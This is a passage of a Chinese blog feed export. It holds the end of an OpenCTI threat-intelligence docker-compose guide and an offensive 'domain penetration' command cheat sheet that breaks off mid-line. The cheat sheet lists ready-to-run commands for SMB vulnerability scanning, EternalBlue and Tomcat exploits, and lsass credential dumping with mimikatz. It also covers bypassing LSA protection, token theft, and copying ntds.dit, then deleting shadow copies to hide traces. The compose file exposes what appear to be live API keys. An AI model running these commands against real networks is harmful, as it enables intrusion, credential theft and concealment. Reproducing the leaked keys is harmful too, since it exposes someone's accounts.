class="line">      - CONNECTOR_LOG_LEVEL=info</span><br><span class="line">    restart: always</span><br><span class="line">    depends_on:</span><br><span class="line">      opencti:</span><br><span class="line">        condition: service_healthy</span><br><span class="line">  connector-cisa-known-exploited-vulnerabilities:</span><br><span class="line">    image: opencti/connector-cisa-known-exploited-vulnerabilities:6.3.5</span><br><span class="line">    environment:</span><br><span class="line">      - OPENCTI_URL=http://xx.xx.xx.xx:8080</span><br><span class="line">      - OPENCTI_TOKEN=<span class="variable">$&#123;OPENCTI_ADMIN_TOKEN&#125;</span> <span class="comment">#generate user token</span></span><br><span class="line">      - CONNECTOR_ID=<span class="variable">$&#123;CONNECTOR_CISAKEV_ID&#125;</span> <span class="comment">#Valid UUIDv4 tokem</span></span><br><span class="line">      - <span class="string">&quot;CONNECTOR_NAME=CISA Known Exploited Vulnerabilities&quot;</span></span><br><span class="line">      - CONNECTOR_SCOPE=cisa</span><br><span class="line">      - CONNECTOR_RUN_AND_TERMINATE=<span class="literal">false</span></span><br><span class="line">      - CONNECTOR_LOG_LEVEL=error</span><br><span class="line">      - CONNECTOR_DURATION_PERIOD=P2D</span><br><span class="line">      - CISA_CATALOG_URL=https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json</span><br><span class="line">      - CISA_CREATE_INFRASTRUCTURES=<span class="literal">false</span></span><br><span class="line">      - CISA_TLP=TLP:CLEAR</span><br><span class="line">      - OPENCTI_JSON_LOGGING=<span class="literal">true</span> <span class="comment"># Enable / disable JSON logging</span></span><br><span class="line">      - CONNECTOR_LOG_LEVEL=info</span><br><span class="line">    restart: always</span><br><span class="line">    depends_on:</span><br><span class="line">      opencti:</span><br><span class="line">        condition: service_healthy</span><br><span class="line">  connector-alienvault:</span><br><span class="line">    image: opencti/connector-alienvault:6.3.5 <span class="comment">#版本号和你安装的opencti版本号一致</span></span><br><span class="line">    environment:</span><br><span class="line">      - OPENCTI_URL=http://xx.xx.xx.xx:8080</span><br><span class="line">      - OPENCTI_TOKEN=<span class="variable">$&#123;OPENCTI_ADMIN_TOKEN&#125;</span></span><br><span class="line">      - CONNECTOR_ID=<span class="variable">$&#123;CONNECTOR_ALIENVAULT_ID&#125;</span>    <span class="comment">##自己随意生成的UUID v4</span></span><br><span class="line">      - CONNECTOR_TYPE=EXTERNAL_IMPORT</span><br><span class="line">      - CONNECTOR_NAME=AlienVault</span><br><span class="line">      - CONNECTOR_SCOPE=alienvault</span><br><span class="line">      - CONNECTOR_CONFIDENCE_LEVEL=15 <span class="comment"># From 0 (Unknown) to 100 (Fully trusted)</span></span><br><span class="line">      - CONNECTOR_UPDATE_EXISTING_DATA=<span class="literal">false</span></span><br><span class="line">      - CONNECTOR_LOG_LEVEL=info</span><br><span class="line">      - ALIENVAULT_BASE_URL=https://otx.alienvault.com</span><br><span class="line">      - ALIENVAULT_API_KEY=*****62aac301394ac5c91202b0b408c            <span class="comment">## ====&gt;注册alienvault之后生成的API的KEY&lt;====</span></span><br><span class="line">      - ALIENVAULT_CREATE_OBSERVABLES=<span class="literal">true</span></span><br><span class="line">      - ALIENVAULT_CREATE_INDICATORS=<span class="literal">true</span></span><br><span class="line">      - ALIENVAULT_PULSE_START_TIMESTAMP=2020-05-01T00:00:00                  <span class="comment"># BEWARE! Could be a lot of pulses!</span></span><br><span class="line">      - ALIENVAULT_REPORT_TYPE=threat-report</span><br><span class="line">      - ALIENVAULT_REPORT_STATUS=New</span><br><span class="line">      - ALIENVAULT_GUESS_MALWARE=<span class="literal">false</span>                                        <span class="comment"># Use tags to guess malware.</span></span><br><span class="line">      - ALIENVAULT_GUESS_CVE=<span class="literal">false</span>                                            <span class="comment"># Use tags to guess CVE.</span></span><br><span class="line">      - ALIENVAULT_EXCLUDED_PULSE_INDICATOR_TYPES=FileHash-MD5,FileHash-SHA1  <span class="comment"># Excluded Pulse indicator types.</span></span><br><span class="line">      - ALIENVAULT_ENABLE_RELATIONSHIPS=<span class="literal">true</span>                                  <span class="comment"># Enable/Disable relationship creation between SDOs.</span></span><br><span class="line">      - ALIENVAULT_ENABLE_ATTACK_PATTERNS_INDICATES=<span class="literal">true</span>                      <span class="comment"># Enable/Disable &quot;indicates&quot; relationships between indicators and attack patterns</span></span><br><span class="line">      - ALIENVAULT_INTERVAL_SEC=3600  <span class="comment">#同步拉取数据的时间，单位为秒</span></span><br><span class="line">    restart: always</span><br><span class="line">    depends_on:</span><br><span class="line">      opencti:</span><br><span class="line">        condition: service_healthy</span><br><span class="line">  connector-ransomware:</span><br><span class="line">    image: opencti/connector-ransomwarelive:6.3.5</span><br><span class="line">    container_name: ransomware-connector</span><br><span class="line">    environment:</span><br><span class="line">      <span class="comment"># Connector&#x27;s definition parameters:</span></span><br><span class="line">      - CONNECTOR_NAME=Ransomware Connector</span><br><span class="line">      - CONNECTOR_SCOPE=identity,attack-pattern,course-of-action,intrusion-set,malware,tool,report</span><br><span class="line">      <span class="comment"># Connector&#x27;s generic execution parameters:</span></span><br><span class="line">      - OPENCTI_URL=http://xx.xx.xx.xx:8080</span><br><span class="line">      - OPENCTI_TOKEN=<span class="variable">$&#123;OPENCTI_ADMIN_TOKEN&#125;</span> <span class="comment">#generate user token</span></span><br><span class="line">      - CONNECTOR_ID=<span class="variable">$&#123;CONNECTOR_RANSOMWARE_ID&#125;</span> <span class="comment">#Valid UUIDv4 tokem</span></span><br><span class="line">      - CONNECTOR_CONFIDENCE_LEVEL=100 <span class="comment"># From 0 (Unknown) to 100 (Fully trusted).</span></span><br><span class="line">      - CONNECTOR_LOG_LEVEL=info <span class="comment"># Log level: debug, info, warn, error</span></span><br><span class="line">      - CONNECTOR_UPDATE_EXISTING_DATA=<span class="literal">false</span></span><br><span class="line">      - CONNECTOR_PULL_HISTORY=<span class="literal">true</span> <span class="comment"># If true, the connector will pull the history of the data. But it is not recommended to set it to true as there will a large influx of data.</span></span><br><span class="line">      - CONNECTOR_HISTORY_START_YEAR=2024 <span class="comment"># Data only goes back till 2020</span></span><br><span class="line">      - CONNECTOR_RUN_EVERY=5m <span class="comment"># 10 minutes will be the ideal time</span></span><br><span class="line">      <span class="comment"># Connector&#x27;s custom execution parameters:</span></span><br><span class="line">    restart: always</span><br><span class="line">    depends_on:</span><br><span class="line">      opencti:</span><br><span class="line">        condition: service_healthy</span><br><span class="line">  connector-cve:</span><br><span class="line">    image: opencti/connector-cve:6.3.5</span><br><span class="line">    environment:</span><br><span class="line">      - OPENCTI_URL=http://xx.xx.xx.xx:8080</span><br><span class="line">      - OPENCTI_TOKEN=<span class="variable">$&#123;OPENCTI_ADMIN_TOKEN&#125;</span> <span class="comment">#generate user token</span></span><br><span class="line">      - CONNECTOR_ID=*************448-d7274d2b99a2 <span class="comment">#Valid UUIDv4 tokem</span></span><br><span class="line">      - CONNECTOR_NAME=Common Vulnerabilities and Exposures</span><br><span class="line">      - CONNECTOR_SCOPE=identity,vulnerability</span><br><span class="line">      - CONNECTOR_RUN_AND_TERMINATE=<span class="literal">false</span></span><br><span class="line">      - CONNECTOR_LOG_LEVEL=error</span><br><span class="line">      - CVE_BASE_URL=https://services.nvd.nist.gov/rest/json/cves/2.0</span><br><span class="line">      - CVE_API_KEY=813ad80f-ec9a-40b4-a991-7377bb49fcad <span class="comment"># Required</span></span><br><span class="line">      - CVE_INTERVAL=2 <span class="comment"># Required, in hours advice min 2</span></span><br><span class="line">      - CVE_MAX_DATE_RANGE=120 <span class="comment"># In days, max 120</span></span><br><span class="line">      - CVE_MAINTAIN_DATA=<span class="literal">true</span> <span class="comment"># Required, retrieve only updated data</span></span><br><span class="line">      - CVE_PULL_HISTORY=<span class="literal">false</span> <span class="comment"># If true, CVE_HISTORY_START_YEAR is required</span></span><br><span class="line">      - CVE_HISTORY_START_YEAR=2019 <span class="comment"># Required if pull_history is True, min 2019 (see documentation CVE and CVSS base score V3.1)</span></span><br><span class="line">    restart: always</span><br><span class="line">  connector-redflag-domains:</span><br><span class="line">    image: opencti/connector-red-flag-domains:6.3.5</span><br><span class="line">    environment:</span><br><span class="line">      - OPENCTI_URL=http://xx.xx.xx.xx:8080</span><br><span class="line">      - OPENCTI_TOKEN=<span class="variable">$&#123;OPENCTI_ADMIN_TOKEN&#125;</span> <span class="comment">#generate user token</span></span><br><span class="line">      - CONNECTOR_ID=*************9-8ab7-1e7e550a9282</span><br><span class="line">      - <span class="string">&quot;CONNECTOR_NAME=Red Flag Domains&quot;</span></span><br><span class="line">      - CONNECTOR_SCOPE=red-flag-domains</span><br><span class="line">      - CONNECTOR_CONFIDENCE_LEVEL=70</span><br><span class="line">      - UPDATE_EXISTING_DATA=<span class="literal">true</span></span><br><span class="line">      - CONNECTOR_LOG_LEVEL=info</span><br><span class="line">      - REDFLAGDOMAINS_URL=https://dl.red.flag.domains/daily/</span><br><span class="line">    restart: always</span><br><span class="line">  connector-urlscan:</span><br><span class="line">    image: opencti/connector-urlscan:6.3.5</span><br><span class="line">    environment:</span><br><span class="line">      - OPENCTI_URL=http://xx.xx.xx.xx:8080</span><br><span class="line">      - OPENCTI_TOKEN=<span class="variable">$&#123;OPENCTI_ADMIN_TOKEN&#125;</span> <span class="comment">#generate user token</span></span><br><span class="line">      - CONNECTOR_ID=*************5b7-bcc8-7fcccfd7be8d</span><br><span class="line">      - CONNECTOR_NAME=Urlscan</span><br><span class="line">      - CONNECTOR_SCOPE=urlscan</span><br><span class="line">      - CONNECTOR_LOG_LEVEL=error</span><br><span class="line">      - CONNECTOR_CONFIDENCE_LEVEL=40 <span class="comment"># From 0 (Unknown) to 100 (Fully trusted)</span></span><br><span class="line">      - CONNECTOR_CREATE_INDICATORS=<span class="literal">true</span></span><br><span class="line">      - CONNECTOR_TLP=white</span><br><span class="line">      - CONNECTOR_LABELS=Phishing,Phishfeed</span><br><span class="line">      - CONNECTOR_INTERVAL=86400 <span class="comment"># seconds, 1d</span></span><br><span class="line">      - CONNECTOR_LOOKBACK=3 <span class="comment"># days</span></span><br><span class="line">      - URLSCAN_URL=https://urlscan.io/api/v1/pro/phishfeed?format=json</span><br><span class="line">      - URLSCAN_API_KEY=c9f3f2c2-0330-401e-8a69-5563178dc781</span><br><span class="line">      - URLSCAN_DEFAULT_X_OPENCTI_SCORE=50</span><br><span class="line">    restart: always</span><br><span class="line">  connector-tweetfeed:</span><br><span class="line">    image: opencti/connector-tweetfeed:6.3.5</span><br><span class="line">    environment:</span><br><span class="line">      - OPENCTI_URL=http://xx.xx.xx.xx:8080</span><br><span class="line">      - OPENCTI_TOKEN=<span class="variable">$&#123;OPENCTI_ADMIN_TOKEN&#125;</span> <span class="comment">#generate user token</span></span><br><span class="line">      - CONNECTOR_ID=*************b417-d5608d8fb407</span><br><span class="line">      - CONNECTOR_NAME=Tweetfeed</span><br><span class="line">      - CONNECTOR_SCOPE=tweetfeed</span><br><span class="line">      - CONNECTOR_CONFIDENCE_LEVEL=15</span><br><span class="line">      - CONNECTOR_LOG_LEVEL=error</span><br><span class="line">      - TWEETFEED_CONFIDENCE_LEVEL=15 <span class="comment"># From 0 (Unknown) to 100 (Fully trusted)</span></span><br><span class="line">      - TWEETFEED_CREATE_INDICATORS=<span class="literal">true</span></span><br><span class="line">      - TWEETFEED_CREATE_OBSERVABLES=<span class="literal">true</span></span><br><span class="line">      - TWEETFEED_INTERVAL=1</span><br><span class="line">      - TWEETFEED_UPDATE_EXISTING_DATA=<span class="literal">true</span></span><br><span class="line">      - <span class="string">&quot;TWEETFEED_ORG_DESCRIPTION=Tweetfeed, a connector to import IOC from Twitter.&quot;</span></span><br><span class="line">      - TWEETFEED_ORG_NAME=Tweetfeed</span><br><span class="line">      - TWEETFEED_DAYS_BACK_IN_TIME=30 <span class="comment"># Number of days to retrieve data back in time</span></span><br><span class="line">    restart: always</span><br><span class="line">  connector-vxvault:</span><br><span class="line">    image: opencti/connector-vxvault:6.3.5</span><br><span class="line">    environment:</span><br><span class="line">      - OPENCTI_URL=http://xx.xx.xx.xx:8080</span><br><span class="line">      - OPENCTI_TOKEN=<span class="variable">$&#123;OPENCTI_ADMIN_TOKEN&#125;</span> <span class="comment">#generate user token</span></span><br><span class="line">      - CONNECTOR_ID=*************8bcd-e65b8daccd2b</span><br><span class="line">      - <span class="string">&quot;CONNECTOR_NAME=VX Vault URL list&quot;</span></span><br><span class="line">      - CONNECTOR_SCOPE=vxvault</span><br><span class="line">      - CONNECTOR_LOG_LEVEL=error</span><br><span class="line">      - VXVAULT_URL=https://vxvault.net/URL_List.php</span><br><span class="line">      - VXVAULT_CREATE_INDICATORS=<span class="literal">true</span></span><br><span class="line">      - VXVAULT_INTERVAL=3 <span class="comment"># In days, must be strictly greater than 1</span></span><br><span class="line">      - VXVAULT_SSL_VERIFY=False</span><br><span class="line">    restart: always</span><br><span class="line">  connector-urlhaus-recent-payloads:</span><br><span class="line">    image: opencti/connector-urlhaus-recent-payloads:6.3.5</span><br><span class="line">    environment:</span><br><span class="line">      - OPENCTI_URL=http://xx.xx.xx.xx:8080</span><br><span class="line">      - OPENCTI_TOKEN=<span class="variable">$&#123;OPENCTI_ADMIN_TOKEN&#125;</span> <span class="comment">#generate user token</span></span><br><span class="line">      - CONNECTOR_ID=*************a943-b27220d0e1a1</span><br><span class="line">      - <span class="string">&quot;CONNECTOR_NAME=URLhaus Recent Payloads&quot;</span></span><br><span class="line">      - CONNECTOR_CONFIDENCE_LEVEL=50 <span class="comment"># From 0 (Unknown) to 100 (Fully trusted)</span></span><br><span class="line">      - CONNECTOR_LOG_LEVEL=error</span><br><span class="line">      - URLHAUS_RECENT_PAYLOADS_API_URL=https://urlhaus-api.abuse.ch/v1/</span><br><span class="line">      - URLHAUS_RECENT_PAYLOADS_COOLDOWN_SECONDS=300 <span class="comment"># Time to wait in seconds between subsequent requests</span></span><br><span class="line">      - URLHAUS_RECENT_PAYLOADS_INCLUDE_FILETYPES=exe,dll,docm,docx,doc,xls,xlsx,xlsm,js,xll <span class="comment"># (Optional) Only download files if any tag matches. (Comma separated)</span></span><br><span class="line">      - URLHAUS_RECENT_PAYLOADS_INCLUDE_SIGNATURES= <span class="comment"># (Optional) Only download files matching these Yara rules. (Comma separated)</span></span><br><span class="line">      - URLHAUS_RECENT_PAYLOADS_SKIP_UNKNOWN_FILETYPES=<span class="literal">true</span> <span class="comment"># Skip files with an unknown file type</span></span><br><span class="line">      - URLHAUS_RECENT_PAYLOADS_SKIP_NULL_SIGNATURE=<span class="literal">true</span> <span class="comment"># Skip files that didn&#x27;t match known Yara rules</span></span><br><span class="line">      - URLHAUS_RECENT_PAYLOADS_LABELS=urlhaus <span class="comment"># (Optional) Labels to apply to uploaded Artifacts. (Comma separated)</span></span><br><span class="line">      - URLHAUS_RECENT_PAYLOADS_LABELS_COLOR=#54483b</span><br><span class="line">      - URLHAUS_RECENT_PAYLOADS_SIGNATURE_LABEL_COLOR=#0059f7 <span class="comment"># Color for Yara rule match label</span></span><br><span class="line">      - URLHAUS_RECENT_PAYLOADS_FILETYPE_LABEL_COLOR=#54483b <span class="comment"># Color to use for filetype label</span></span><br><span class="line">    restart: always</span><br><span class="line">  connector-cyber-campaign-collection:</span><br><span class="line">    image: opencti/connector-cyber-campaign-collection:6.3.5</span><br><span class="line">    environment:</span><br><span class="line">      - OPENCTI_URL=http://xx.xx.xx.xx:8080</span><br><span class="line">      - OPENCTI_TOKEN=<span class="variable">$&#123;OPENCTI_ADMIN_TOKEN&#125;</span> <span class="comment">#generate user token</span></span><br><span class="line">      - CONNECTOR_ID=*************87-ac9e107b772f</span><br><span class="line">      - <span class="string">&quot;CONNECTOR_NAME=APT &amp; Cybercriminals Campaign Collection&quot;</span></span><br><span class="line">      - CONNECTOR_SCOPE=report</span><br><span class="line">      - CONNECTOR_RUN_AND_TERMINATE=<span class="literal">false</span></span><br><span class="line">      - CONNECTOR_LOG_LEVEL=error</span><br><span class="line">      - CYBER_MONITOR_GITHUB_TOKEN= <span class="comment"># If not provided, rate limit will be very low</span></span><br><span class="line">      - CYBER_MONITOR_FROM_YEAR=2018</span><br><span class="line">      - CYBER_MONITOR_INTERVAL=4 <span class="comment"># In days, must be strictly greater than 1</span></span><br><span class="line">    restart: always</span><br><span class="line">volumes:</span><br><span class="line">  esdata:</span><br><span class="line">  s3data:</span><br><span class="line">  redisdata:</span><br><span class="line">  amqpdata:</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大家直接抄作业，然后记得修改uid和apikey</p><p>然后加完后,更新工程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="/google/3196a87b/img_6.png" alt="img.png"><br><img src="/google/3196a87b/img_7.png" alt="img.png"><br><img src="/google/3196a87b/img_8.png" alt="img.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="工具" scheme="http://example.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="开源威胁情报" scheme="http://example.com/tags/%E5%BC%80%E6%BA%90%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>域渗透一条龙命令集合</title>
    <link href="http://example.com/google/cdeaf865.html"/>
    <id>http://example.com/google/cdeaf865.html</id>
    <published>2024-09-19T15:04:04.000Z</published>
    <updated>2024-09-19T15:05:40.091Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><font style="color:#000000;"></font></p><h1 id="1-无凭证情况下"><a href="#1-无凭证情况下" class="headerlink" title="1.无凭证情况下"></a><font style="color:#74B602;"></font><font style="color:#000000;">1.无凭证情况下</font></h1><h2 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a><font style="color:#000000;">网络扫描</font></h2><table><thead><tr><th><code>plain cme smb &lt;ip_range&gt; # SMB 扫描存活主机 nmap -sP -p &lt;ip&gt; # ping 扫描 nmap -PN -sV --top-ports 50 --open &lt;ip&gt; # 快速扫描 nmap -PN --script smb-vuln* -p139,445 &lt;ip&gt; # 检测 SMB 漏洞 nmap -PN -sC -sV &lt;ip&gt; # 经典扫描 nmap -PN -sC -sV -p- &lt;ip&gt; # 全扫描 nmap -sU -sC -sV &lt;ip&gt; # UDP 扫描 </code></th></tr></thead></table><h2 id="漏洞快速探测"><a href="#漏洞快速探测" class="headerlink" title="漏洞快速探测"></a><font style="color:#74B602;"></font><font style="color:#000000;">漏洞快速探测</font></h2><p><font style="color:#000000;">扫描后可以去先用已知漏洞打</font></p><table><thead><tr><th><code>plain java rmi： exploit/multi/misc/java_rmi_server ms17-010：exploit/windows/smb/ms17_010_eternalblue tomcat：auxiliary/scanner/http/tomcat_enum jboss manager：exploit/multi/http/tomcat_mgr_deploy Java反序列化漏洞测试：ysoserial 查找产品的CVE漏洞：searchsploit MS14-025： searchsploit    findstr /S /I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml 爆破数据库连接：use admin/mssql/mssql_enum_sql_logins proxylogon： proxyshell： </code></th></tr></thead></table><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a><font style="color:#000000;">提权</font></h2><p><font style="color:#000000;">低权限可以做的事情</font></p><table><thead><tr><th><code>plain winpeas.exe 查找内容有 password 的文件：findstr /si &#39;password&#39; *.txt *.xml *.docx Juicy Potato / Lovely Potato PrintSpoofer RoguePotato SMBGhost CVE-2020-0796 CVE-2021-36934 (HiveNightmare/SeriousSAM) ...... </code></th></tr></thead></table><h2 id="拥有本地管理员权限"><a href="#拥有本地管理员权限" class="headerlink" title="拥有本地管理员权限"></a><font style="color:#000000;">拥有本地管理员权限</font></h2><h3 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a><u><font style="color:#000000;">获取密码</font></u></h3><table><thead><tr><th><code>plain procdump.exe -accepteula -ma lsass.exe lsass.dmp  mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords&quot; &quot;exit&quot;  mimikatz &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; &quot;lsadump::sam&quot; &quot;exit&quot;  hashdump: post/windows/gather/smart_hashdump cme smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -M lsassy cme smb &lt;ip_range&gt; -u &lt;user&gt; -p &#39;&lt;password&gt;&#39; --sam / --lsa / --ntds </code></th></tr></thead></table><h3 id="绕过LSA防护策略读取密码"><a href="#绕过LSA防护策略读取密码" class="headerlink" title="绕过LSA防护策略读取密码"></a><u><font style="color:#000000;">绕过LSA防护策略读取密码</font></u></h3><p>| <code>plain PPLdump64.exe &lt;lsass.exe|lsass_pid&gt; lsass.dmp  mimikatz &quot;!+&quot; &quot;!processprotect /process:lsass.exe /remove&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot;  &quot;sekurlsa::logonpasswords&quot; &quot;!processprotect  /process:lsass.exe&quot; &quot;!-&quot; #with mimidriver.sys </code>  |<br>| — |</p><h3 id="token窃取"><a href="#token窃取" class="headerlink" title="token窃取"></a><u><font style="color:#000000;">token窃取</font></u></h3><table><thead><tr><th><code>plain .\incognito.exe list_tokens -u .\incognito.exe execute -c &quot;&lt;domain&gt;\&lt;user&gt;&quot; powershell.exe  use incognito impersonate_token &lt;domain&gt;\\&lt;user&gt; </code></th></tr></thead></table><p><font style="color:#000000;">之前粗略分析过 token</font></p><p><a href="https://0range-x.github.io/2021/09/30/Token%E7%AA%83%E5%8F%96%E9%82%A3%E4%BA%9B%E4%BA%8B/"><font style="color:#000000;">Token窃取那些事 (0range-x.github.io)</font></a></p><h3 id="查看本地存储的所有密码"><a href="#查看本地存储的所有密码" class="headerlink" title="查看本地存储的所有密码"></a><u><font style="color:#000000;">查看本地存储的所有密码</font></u></h3><table><thead><tr><th><code>plain lazagne.exe all </code></th></tr></thead></table><h3 id="卷影拷贝（获取域控所有hash）"><a href="#卷影拷贝（获取域控所有hash）" class="headerlink" title="卷影拷贝（获取域控所有hash）"></a><u><font style="color:#000000;">卷影拷贝（获取域控所有hash）</font></u></h3><table><thead><tr><th><code>plain diskshadow list shadows all  mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\ </code></th></tr></thead></table><table><thead><tr><th><code>plain 管理员权限执行  vssadmin create shadow /for=C:  利用卷影副本卷名拷贝ntds.dit文件与用注册表导出system.hive   copy \\?\GLOBALLROOT\Device\xxxxxxxxxx\windows\ntds\ntds.dit C:\ntds.dit reg sava hklm\system system.hive  //导出system.hive文件到注册表   vssadmin delete shadows /for=C: /quiet   //删除卷影，隐藏痕迹 </code></th></tr></thead></table><p><a href="https://0range-x.github.io/2021/11/22/CVE-2020-1472/#vssadmin%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D"><font style="color:#000000;">CVE-2020-1472的分析与复现 (0range-x.github.io)</font></a></p><h3 id="dpapi解密"><a href="#dpapi解密" class="headerlink" title="dpapi解密"></a><u><font style="color:#000000;">dpapi解密</font></u></h3><h1 id="2-内网信息收集"><a href="#2-内网信息收集" class="headerlink" title="2.内网信息收集"></a><font style="color:#000000;">2.内网信息收集</font></h1><h2 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a><font style="color:#000000;">本机信息收集</font></h2><table><thead><tr><th><code>plain 1、用户列表  net user /domain windows用户列表 分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户  2.进程列表  tasklist /svc 分析杀毒软件/安全监控工具等 邮件客户端 VPN ftp等  3.服务列表tasklist /svc 与安全防范工具有关服务[判断是否可以手动开关等] 存在问题的服务[权限/漏洞]  4.端口列表netstat -ano 开放端口对应的常见服务/应用程序[匿名/权限/漏洞等] 利用端口进行信息收集  5.补丁列表systeminfo 分析 Windows 补丁 第三方软件[Java/Oracle/Flash 等]漏洞  6.本机共享smbclient -L ip      net user \\ip\c$ 本机共享列表/访问权限 本机访问的域共享/访问权限  7.本用户习惯分析 历史记录 收藏夹 文档等 </code></th></tr></thead></table><h3 id="8-获取当前用户密码"><a href="#8-获取当前用户密码" class="headerlink" title="8.获取当前用户密码"></a><u><font style="color:#000000;">8.获取当前用户密码</font></u></h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><font style="color:#000000;">Windows</font></h4><ul><li><a href="https://github.com/gentilkiwi/mimikatz"><font style="color:#000000;">mimikatz</font></a></li><li><a href="https://github.com/peewpw/Invoke-WCMDump"><font style="color:#000000;">Invoke-WCMDump</font></a></li><li><a href="https://github.com/giMini/mimiDbg"><font style="color:#000000;">mimiDbg</font></a></li><li><a href="https://github.com/AlessandroZ/LaZagne"><font style="color:#000000;">LaZagne</font></a></li><li><a href="http://launcher.nirsoft.net/downloads/"><font style="color:#000000;">NirLauncher )</font></a></li><li><a href="https://github.com/quarkslab/quarkspwdump"><font style="color:#000000;">quarkspwdump</font></a></li></ul><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><font style="color:#000000;">Linux</font></h4><ul><li><a href="https://github.com/huntergregal/mimipenguin"><font style="color:#000000;">mimipenguin</font></a></li><li><a href="https://github.com/AlessandroZ/LaZagne"><font style="color:#000000;">LaZagne</font></a></li></ul><h4 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a><font style="color:#000000;">浏览器</font></h4><ul><li><a href="https://github.com/moonD4rk/HackBrowserData"><font style="color:#000000;">HackBrowserData</font></a></li><li><a href="https://github.com/djhohnstein/SharpWeb"><font style="color:#000000;">SharpWeb</font></a></li><li><a href="https://github.com/GhostPack/SharpDPAPI"><font style="color:#000000;">SharpDPAPI</font></a></li><li><a href="https://github.com/hayasec/360SafeBrowsergetpass"><font style="color:#000000;">360SafeBrowsergetpass</font></a></li><li><a href="https://github.com/QAX-A-Team/BrowserGhost/"><font style="color:#000000;">BrowserGhost</font></a></li><li><a href="https://github.com/DeEpinGh0st/Browser-cookie-steal"><font style="color:#000000;">Browser-cookie-steal(窃取浏览器cookie)</font></a></li></ul><h4 id="Navicat密码"><a href="#Navicat密码" class="headerlink" title="Navicat密码"></a><font style="color:#000000;">Navicat密码</font></h4><p><font style="color:#000000;">版本：Navicat 11或12</font></p><p><font style="color:#000000;">方法：</font><a href="https://blog.csdn.net/CCESARE/article/details/104746596"><font style="color:#000000;">https://blog.csdn.net/CCESARE/article/details/104746596</font></a></p><p><font style="color:#000000;">解密脚本：</font><a href="https://github.com/tianhe1986/FatSmallTools"><font style="color:#000000;">https://github.com/tianhe1986/FatSmallTools</font></a></p><p><a href="https://github.com/HyperSine/how-does-navicat-encrypt-password"><font style="color:#000000;">https://github.com/HyperSine/how-does-navicat-encrypt-password</font></a></p><h4 id="xshell-xftp密码"><a href="#xshell-xftp密码" class="headerlink" title="xshell&amp;xftp密码"></a><font style="color:#000000;">xshell&amp;xftp密码</font></h4><p><a href="https://github.com/dzxs/Xdecrypt"><font style="color:#000000;">https://github.com/dzxs/Xdecrypt</font></a></p><h4 id="mRemoteNG密码"><a href="#mRemoteNG密码" class="headerlink" title="mRemoteNG密码"></a><font style="color:#000000;">mRemoteNG密码</font></h4><p><a href="https://github.com/kmahyyg/mremoteng-decrypt"><font style="color:#000000;">https://github.com/kmahyyg/mremoteng-decrypt</font></a></p><p><a href="https://github.com/haseebT/mRemoteNG-Decrypt"><font style="color:#000000;">https://github.com/haseebT/mRemoteNG-Decrypt</font></a></p><h2 id="扩散信息收集"><a href="#扩散信息收集" class="headerlink" title="扩散信息收集"></a><font style="color:#000000;">扩散信息收集</font></h2><h3 id="常用端口扫描工具"><a href="#常用端口扫描工具" class="headerlink" title="常用端口扫描工具"></a><u><font style="color:#000000;">常用端口扫描工具</font></u></h3><ul><li><font style="color:#000000;">nmap</font></li><li><font style="color:#000000;">masscan</font></li><li><font style="color:#000000;">zmap</font></li><li><font style="color:#000000;">s扫描器</font></li><li><font style="color:#000000;">自写脚本</font></li><li><font style="color:#000000;">nc</font></li><li><font style="color:#000000;">……</font></li></ul><h3 id="内网拓扑架构分析"><a href="#内网拓扑架构分析" class="headerlink" title="内网拓扑架构分析"></a><u><font style="color:#000000;">内网拓扑架构分析</font></u></h3><ul><li><font style="color:#000000;">DMZ</font></li><li><font style="color:#000000;">管理网</font></li><li><font style="color:#000000;">生产网</font></li><li><font style="color:#000000;">测试网</font></li></ul><h3 id="常见信息收集命令"><a href="#常见信息收集命令" class="headerlink" title="常见信息收集命令"></a><u><font style="color:#000000;">常见信息收集命令</font></u></h3><p><font style="color:#000000;">ipconfig：</font></p><table><thead><tr><th><code>plain ipconfig /all ------&gt; 查询本机 IP 段，所在域等 </code></th></tr></thead></table><p><font style="color:#000000;">net</font></p><table><thead><tr><th><code>plain net user ------&gt; 本机用户列表 net localgroup administrators ------&gt; 本机管理员[通常含有域用户] net user /domain ------&gt; 查询域用户 net group /domain ------&gt; 查询域里面的工作组 net group &quot;domain admins&quot; /domain ------&gt; 查询域管理员用户组 net localgroup administrators /domain ------&gt; 登录本机的域管理员 net localgroup administrators workgroup\user001 /add -----&gt;域用户添加到本机 net group &quot;Domain controllers&quot; -------&gt; 查看域控制器(如果有多台) net view ------&gt; 查询同一域内机器列表 net view /domain ------&gt; 查询域列表 net view /domain:domainname </code></th></tr></thead></table><p><font style="color:#000000;">dsquery</font></p><table><thead><tr><th><code>plain dsquery computer domainroot -limit 65535 &amp;&amp; net group &quot;domain 